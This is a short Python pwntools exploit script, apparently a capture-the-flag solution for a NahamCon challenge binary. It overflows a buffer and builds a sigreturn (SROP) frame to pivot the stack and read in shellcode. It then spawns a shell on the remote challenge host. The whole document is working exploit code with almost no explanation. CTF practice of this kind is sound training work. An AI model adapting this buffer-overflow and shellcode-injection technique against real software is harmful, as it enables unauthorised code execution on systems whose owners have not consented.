#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('some-really-ordinary-program')
# p = process(elf.path)
# gdb.attach(p, 'init-gef\nb *0x0040105c')
p = remote("challenge.nahamcon.com", 31267)


shellcode = asm(shellcraft.sh())

# args -> location, size
read_function = 0x00401000

# can use to setup rax value
main = 0x00401022

syscall_ret = 0x0040101f

new_stack = 0x402040

rwx_addr = new_stack + 0x200

payload = "A" * 508
payload += flat(
    main,
    syscall_ret
)

frame = SigreturnFrame(kernel="amd64")
frame.rsp = new_stack
frame.rdi = new_stack
frame.rsi = 0x400
frame.rip = read_function
payload += str(frame)


p.sendafter("is what you get.\n", payload)
p.sendafter("is what you get.\n", "A" * 15)


payload2 = p64(rwx_addr)
payload2 = payload2.ljust(0x200, '\x00')
payload2 += shellcode

p.sendafter("A" * 15, payload2)

p.interactive()
